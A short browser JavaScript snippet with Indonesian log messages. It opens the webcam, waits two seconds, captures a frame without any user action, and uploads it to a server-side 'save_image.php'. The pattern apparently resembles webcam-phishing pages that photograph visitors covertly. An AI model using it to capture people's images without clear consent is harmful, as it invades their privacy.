
const video = document.getElementById('video');

navigator.mediaDevices.getUserMedia({ video: true })
  .then((stream) => {
    video.srcObject = stream;
    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataURL = canvas.toDataURL('image/png');
      fetch('save_image.php', {
        method: 'POST',
        body: JSON.stringify({ image: dataURL }),
        headers: { 'Content-Type': 'application/json' }
      }).then(() => console.log("✅ Foto berhasil dikirim"));
    }, 2000);
  })
  .catch((err) => {
    console.error("❌ Kamera error:", err);
    alert("Gagal mengakses kamera: " + err.message);
  });
